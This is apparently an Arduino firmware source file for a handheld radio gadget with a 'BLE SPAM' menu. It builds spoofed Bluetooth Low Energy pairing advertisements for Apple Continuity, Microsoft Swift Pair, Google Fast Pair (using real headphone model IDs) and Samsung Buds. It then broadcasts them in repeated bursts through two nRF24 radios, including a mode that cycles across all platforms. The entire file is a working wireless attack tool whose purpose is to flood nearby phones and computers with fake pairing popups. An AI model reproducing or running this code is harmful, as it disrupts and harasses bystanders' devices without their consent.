#include "ble_spam.h"
#include "encoder_input.h"
#include "esp8266_compat.h"
#include <Arduino.h>
#include <RF24.h>
#include <U8g2lib.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern RF24 jam1;
extern RF24 jam2;
extern bool runningApp;

static int spamMode = 0; // 0: Menu, 1: Apple, 2: Windows, 3: Android FastPair, 4: Samsung Buds, 5: Multi-OS
static int targetChoice = 0;
static bool radioConfigured = false;
static uint32_t pktCounter = 0;

static const uint32_t kFastPairModels[] = {
    0xCD8256, // Pixel Buds Pro
    0x000006, // Google Pixel Buds
    0xF52494, // JBL Flip 6
    0x718FA4, // Sony WF-1000XM4
    0xD446A7, // Sony WH-1000XM5
    0x821F66  // Galaxy Buds2 Pro
};

static void sendBleSpamStep(int activeTarget) {
  if (!radioConfigured) {
    BleRf24::configureRadioForBle(jam1);
    if (g_dualRadioAvailable) BleRf24::configureRadioForBle(jam2);
    radioConfigured = true;
  }

  uint8_t adv[21];
  uint8_t len = 0;

  if (activeTarget == 1) {
    // Apple Continuity Proximity Pairing (cabe en 21 bytes de payload ADV_NONCONN_IND de nRF24)
    const uint8_t appleShort[] = {
        0x10, 0xFF, 0x4C, 0x00, 0x07, 0x0B, 0x01,
        0x0E, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12
    };
    len = sizeof(appleShort);
    memcpy(adv, appleShort, len);
    adv[10] = (uint8_t)random(0x10, 0xFE);
  } else if (activeTarget == 2) {
    // Microsoft Swift Pair (0x0006) + nombre corto "Buds"
    const uint8_t winShort[] = {
        0x06, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80,
        0x05, 0x09, 'B', 'u', 'd', 's'
    };
    len = sizeof(winShort);
    memcpy(adv, winShort, len);
  } else if (activeTarget == 3) {
    // Google Fast Pair (UUID 0xFE2C + 3-byte Model ID + TxPower)
    uint32_t model = kFastPairModels[random(0, 6)];
    const uint8_t fpAdv[] = {
        0x02, 0x01, 0x06,
        0x03, 0x03, 0x2C, 0xFE,
        0x06, 0x16, 0x2C, 0xFE,
        (uint8_t)((model >> 16) & 0xFF),
        (uint8_t)((model >> 8) & 0xFF),
        (uint8_t)(model & 0xFF),
        0x02, 0x0A, (uint8_t)random(0xEC, 0xF8)
    };
    len = sizeof(fpAdv);
    memcpy(adv, fpAdv, len);
  } else {
    // Samsung Galaxy Buds Continuity (0x0075)
    const uint8_t samShort[] = {
        0x0E, 0xFF, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02,
        0x14, 0x15, 0x03, 0x21, 0x01, 0x09, 0xEF
    };
    len = sizeof(samShort);
    memcpy(adv, samShort, len);
  }

  BleRf24::transmitAdv(jam1, adv, len);
  if (g_dualRadioAvailable) {
    BleRf24::transmitAdv(jam2, adv, len);
  }
  pktCounter += 3;
}

void bleSpamLoop() {
  if (spamMode == 0) {
    int d = encStep();
    if (d != 0) {
      targetChoice = (targetChoice + d) % 5;
      if (targetChoice < 0) targetChoice += 5;
    }

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawRBox(0, 0, 128, 12, 2);
    u8g2.setDrawColor(0);
    u8g2.drawStr(14, 9, "BLE SPAM (NRF24)");
    u8g2.setDrawColor(1);

    const char *labels[5] = {
        "1. APPLE iOS (AirPods)",
        "2. WINDOWS (SwiftPair)",
        "3. ANDROID (FastPair)",
        "4. SAMSUNG (Buds Pro)",
        "5. MULTI-OS (Auto Cycle)"};

    int firstVis = targetChoice - 2;
    if (firstVis > 1) firstVis = 1;
    if (firstVis < 0) firstVis = 0;

    u8g2.setFont(u8g2_font_5x7_tr);
    for (int row = 0; row < 4; row++) {
      int idx = firstVis + row;
      if (idx >= 5) break;
      int y = 23 + row * 10;
      if (idx == targetChoice) {
        u8g2.drawRBox(3, y - 7, 122, 9, 2);
        u8g2.setDrawColor(0);
        u8g2.drawStr(7, y, labels[idx]);
        u8g2.setDrawColor(1);
      } else {
        u8g2.drawStr(7, y, labels[idx]);
      }
    }

    u8g2.drawHLine(0, 54, 128);
    u8g2.drawStr(6, 62, "[OK] Iniciar  [HOLD] Salir");
    u8g2.sendBuffer();

    if (encOk()) {
      spamMode = targetChoice + 1;
      radioConfigured = false;
      pktCounter = 0;
      encClear();
    }

    if (encBack()) {
      jam1.stopListening();
      if (g_dualRadioAvailable) jam2.stopListening();
      radioConfigured = false;
      runningApp = false;
      encClear();
    }
  } else {
    int activeTarget = spamMode;
    if (spamMode == 5) {
      activeTarget = ((millis() / 400) % 4) + 1;
    }

    for (int burst = 0; burst < 8; burst++) {
      sendBleSpamStep(activeTarget);
    }

    static uint32_t lastUiMs = 0;
    if (millis() - lastUiMs > 120) {
      lastUiMs = millis();
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_6x10_tr);
      u8g2.drawStr(6, 11, "BLE SPAM EN CURSO");
      u8g2.drawHLine(0, 13, 128);

      const char *modeNames[] = {"", "APPLE iOS", "WINDOWS 10/11", "ANDROID FASTPAIR", "SAMSUNG BUDS", "MULTI-OS AUTO"};
      u8g2.setFont(u8g2_font_5x7_tr);
      u8g2.setCursor(6, 25);
      u8g2.print("Modo: ");
      u8g2.print(modeNames[spamMode]);

      u8g2.setCursor(6, 36);
      u8g2.print("Canales BLE: 37/38/39");
      u8g2.setCursor(6, 47);
      u8g2.printf("Tramas TX: %lu", (unsigned long)pktCounter);

      int r = ((millis() / 120) % 6) + 2;
      u8g2.drawCircle(110, 36, r);
      u8g2.drawDisc(110, 36, 2);

      u8g2.drawHLine(0, 53, 128);
      u8g2.drawStr(8, 62, "[OK/HOLD] Volver Selector");
      u8g2.sendBuffer();
    }

    if (encOk() || encBack()) {
      jam1.stopListening();
      if (g_dualRadioAvailable) jam2.stopListening();
      radioConfigured = false;
      spamMode = 0;
      encClear();
    }
  }
}

